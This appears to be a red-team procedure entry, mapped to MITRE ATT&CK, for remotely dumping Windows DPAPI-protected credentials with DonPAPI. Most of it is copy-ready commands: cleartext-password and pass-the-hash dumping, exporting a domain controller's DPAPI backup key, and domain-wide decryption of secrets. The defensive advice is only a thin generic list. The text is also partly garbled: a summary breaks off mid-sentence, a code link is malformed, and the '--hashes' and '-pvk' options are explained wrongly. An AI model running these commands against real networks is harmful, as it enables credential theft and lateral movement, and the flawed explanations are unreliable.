---
id: 41dd7b40-f9bc-4923-8145-f7dc29eff57d
name: Remote DPAPI Credential Dumping with DonPAPI
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.357768+00:00'
updated_at: '2023-04-10T20:37:13.628747+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Data Protection API]]'
- '[[DonPAPI - Dumping DPAPI credz remotely]]'
- '[[Windows - DPAPI]]'
commands:
- '[[DonPAPI.py domain/user:passw0rd@target]]'
- '[[DonPAPI.py --hashes <LM>:<NT> domain/user@target]]'
- '[[dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip]]'
- '[[python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list]]'
---

# Remote DPAPI Credential Dumping with DonPAPI

## Summary

Remote DPAPI credential dumping with DonPAPI is a technique that allows an attacker to retrieve passwords and other sensitive data that is protected by the Data Protection API (DPAPI) on a remote Windows system. DPAPI is a Windows API that provides data protection for sensitive information, such as

## Description

# Description

Remote DPAPI credential dumping with DonPAPI is a technique that allows an attacker to retrieve passwords and other sensitive data that is protected by the Data Protection API (DPAPI) on a remote Windows system. DPAPI is a Windows API that provides data protection for sensitive information, such as passwords, using symmetric encryption. DonPAPI is a tool that can be used to dump DPAPI credentials remotely. This technique can be used by attackers to gain access to sensitive information that is stored on a remote system, such as login credentials or other sensitive data that is protected by DPAPI.

## Requirements

1. Remote access to a Windows system that is running DPAPI.

1. Access to DonPAPI tool.

## Defense

1. Ensure that remote access to Windows systems is restricted to authorized users only.

1. Implement strong password policies and multi-factor authentication to prevent unauthorized access to sensitive information.

1. Regularly monitor and review logs for suspicious activity, such as attempts to dump DPAPI credentials remotely.

## Objectives

1. Retrieve sensitive information, such as passwords, from a remote Windows system.

1. Gain access to sensitive information that is protected by DPAPI on a remote system.

# Instructions

1. This command provides various options to extract domain hashes and backup keys. The commands are as follows: 
1. DonPAPI.py domain/user:passw0rd@target: This command extracts all hashes from the target machine.
2. DonPAPI.py --hashes <LM>:<NT> domain/user@target: This command extracts specific hashes from the target machine.
3. dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip: This command exports the backup key of the target domain controller.
4. python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list: This command decrypts the backup key and exports the hashes from the domain network list.

**Code**: [[DonPAPI.py domain/user:passw0rd@target
DonPAPI.py ]]

> The first command extracts all hashes from the target machine. The second command extracts specific hashes from the target machine. The third command exports the backup key of the target domain controller. The fourth command decrypts the backup key and exports the hashes from the domain network list. The arguments used in these commands are as follows:
1. domain/user:passw0rd@target: This argument is used to specify the domain, username, password and target machine.
2. --hashes <LM>:<NT> domain/user@target: This argument is used to specify the type of hashes to be extracted and the target machine.
3. --export -t domain/user:passw0rd@target_dc_ip: This argument is used to specify the domain, username, password and target domain controller IP address.
4. -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list: This argument is used to specify the backup key file, domain, username, password and domain network list.

**Command** ([[DonPAPI.py domain/user:passw0rd@target]]):

```bash
DonPAPI.py domain/user:passw0rd@target
```

**Command** ([[DonPAPI.py --hashes <LM>:<NT> domain/user@target]]):

```bash
DonPAPI.py --hashes <LM>:<NT> domain/user@target
```

**Command** ([[dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip]]):

```bash
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
```

**Command** ([[python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list]]):

```bash
python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[DonPAPI.py domain/user:passw0rd@target]]
- [[DonPAPI.py --hashes <LM>:<NT> domain/user@target]]
- [[dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip]]
- [[python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list]]

## Tags

- [[Data Protection API]]
- [[DonPAPI - Dumping DPAPI credz remotely]]
- [[Windows - DPAPI]]
